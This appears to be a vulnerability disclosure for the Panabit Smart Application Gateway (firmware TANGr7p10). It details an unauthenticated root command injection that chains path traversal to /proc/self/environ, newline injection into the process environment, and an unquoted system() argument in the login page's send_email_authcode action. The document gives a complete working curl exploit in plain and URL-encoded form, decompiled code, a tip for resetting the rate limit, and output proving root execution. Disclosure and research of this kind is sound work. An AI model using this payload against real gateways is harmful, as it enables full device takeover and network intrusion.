# Panabit Smart Application Gateway

- Vendor: Beijing Panabit Software Co., Ltd. (Panabit)
- Product: Panabit Smart Application Gateway / Internet Behavior Management (PanabitFREE edition; same-source SMB/OEM/MGW series)
- Firmware Version: TANGr7p10 (`PanabitFREE_TANGr7p10_20260817_Linux3`, built 2026-08-17, x86-64)
- Vulnerability Type: Unauthenticated OS Command Injection (CWE-78 / CWE-22)

## Overview

In Panabit's login-page script `admin/login/user.cgi`, the "send e-mail verification code" action `send_email_authcode` concatenates the request parameter `username` into the file path `%s/etc/webuser/%s` with no validation (path traversal), then `load_config()` writes every `KEY=VALUE` line of that file unconditionally into the process environment (`setenv`, overwrite=1), and finally the environment variable `email` is inserted **unquoted** into the `receiver=%s` position of a `system()` command line. Because the action sits under the httpd's **unauthenticated `/login/**` prefix**, an attacker needs only **one request without any Cookie** to execute arbitrary commands as root:

```bash
curl -sk -i -X POST https://127.0.0.1:18443/login/user.cgi -d 'action=send_email_authcode' -d 'palang=ch' --data-urlencode 'username=../../../../../../../proc/self/environ' --data-urlencode "e=$(printf '\nemail=;id>/tmp/RPT_E;')"
```

Equivalent URL-encoded form: `POST /login/user.cgi` with body `action=send_email_authcode&palang=ch&username=..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fenviron&e=%0Aemail%3D%3Bid%3E%2Ftmp%2FRPT_E%3B`

## Vulnerability Details

A three-link root-cause chain, all required (`send_email_authcode`, function `0x403540`):

```c
char path[256];
snprintf(path, 0x100, "%s/etc/webuser/%s",      /* 0x406350, only 2 references in the whole binary */
         PGPATH_global,                          /* "/usr/ramdisk" */
         getenv_strip_quotes("CGI_username"));   /* 0x406288 — no str_decode, no blacklist */
if (access(path, F_OK)) { retjson(1, ...); }     /* 0x403584 — only requires "file exists" */
load_config(path);                               /* 0x403599 — arbitrary file → environment variables */
...
b = getenv_strip_quotes("email");                /* 0x4063ea */
sprintf(cmd, 0x406bf8, a, b);                    /* 0x40366d */
system(cmd);                                     /* 0x403677 — the sink */
```

① **Path traversal (CWE-22)**: `send_email_authcode` concatenates the **raw** `CGI_username` into `/usr/ramdisk/etc/webuser/<username>`; it neither calls `0x402030` (the "lowercase-hex allowlist + `str_decode`" check used by `local_login` / `edit_password` in the same file) nor applies a metacharacter blacklist → `username=../../../../../../../<any path>` works.

② **Arbitrary file → environment variables (CWE-15 / CWE-73)**: `load_config` (`0x401e80`) reads the file line by line and, for every `KEY=VALUE` line, calls `setenv(KEY, VALUE, /*overwrite=*/1)` — **no key-name validation, no value filtering**.

③ **Unquoted insertion into `system()` (CWE-78)**: the 2nd `%s` of format string `0x406bf8` sits at `receiver=%s` and is **not quoted**:

```
/usr/ramdisk/bin/ipe_msgpush send_email msg_title=Panabit登录验证码 \
  msg_ctx="<br>...您的验证码是<b>&nbsp;%s</b>..." receiver=%s
                                            ↑ CODE (quoted, safe)  ↑ email (bare concatenation, injection point)
```

**Key pitfalls**:

- `email` is **not** a request parameter name: httpd exports form parameters as `CGI_email`, whereas the code reads the **unprefixed** `email`. This is exactly why the attacker must first use ① and ② to inject a line `email=<payload>` into the **process environment** — the chain closes there.
- The newline injection rides on the unused parameter `e` via `%0A`: httpd performs URL decoding **before** exporting environment variables, so `%0A` becomes a real LF in the environment value, making `load_config` **hard-break** the line where the attacker chooses, immediately forming an independent line `email=;id>/tmp/RPT_E;` (the line end is truncated by the environment block's own NUL).
- **Rate limit**: a per-source-IP 180-second limit (`EMAIL_CODE_<REMOTE_ADDR>` not yet expired returns `请180秒后再获取验证码!`). The first request is exploitable; before retesting run `sudo find /usr/ramdisk -name 'EMAIL_CODE*' -delete`.

## Proof of Concept

**Prerequisite**: on analysis host 192.168.35.137, symlink `/usr/ramdisk` + `/etc/PG.conf`, then start the real httpd with `ipe_httpd ssl=1 port=18443 user=root dir=/usr/ramdisk/admin charset=gb2312` (it launches the CGI as root).

**Step 1 — send the injection request** (**without any Cookie**; a single request yields root):

```bash
curl -sk -i -X POST https://127.0.0.1:18443/login/user.cgi \
     -d 'action=send_email_authcode' -d 'palang=ch' \
     --data-urlencode 'username=../../../../../../../proc/self/environ' \
     --data-urlencode "e=$(printf '\nemail=;id>/tmp/RPT_E;')"
```

Response: `HTTP/1.0 200 OK` + `{ "code": 0, "msg": "发送成功" }` (blind injection, no output; see Step 3).

**Step 2 — confirm the write landed**:

```bash
ls -l /tmp/RPT_E
```

Response: `-rw-r--r-- 1 root root 39 /tmp/RPT_E` (root-owned, written successfully).

**Step 3 — retrieve the command output**:

```bash
cat /tmp/RPT_E
```

![image-20261017180514515](.\image-20261017180514515.png)

## Impact

An unauthenticated attacker executes arbitrary commands as root: read/write any file, change the admin password, plant persistent backdoors, tamper with traffic policy and audit, and pivot into the internal network. The payload is fully self-contained (`/proc/self/environ` always exists; no pre-existing writable file is required).

## Reproduction Result

Verified end-to-end against the real `ipe_httpd` (HTTPS 18443), through `/proc/self/environ` traversal plus newline injection in `e`:

```
$ cat /tmp/RPT_E
uid=0(root) gid=0(root) groups=0(root)

$ ls -l /tmp/RPT_E
-rw-r--r-- 1 root root 39 /tmp/RPT_E
```

The injected command executed as root, with output retrievable. Only non-destructive commands (`id`) were used; no reboot/restore/upgrade was invoked.
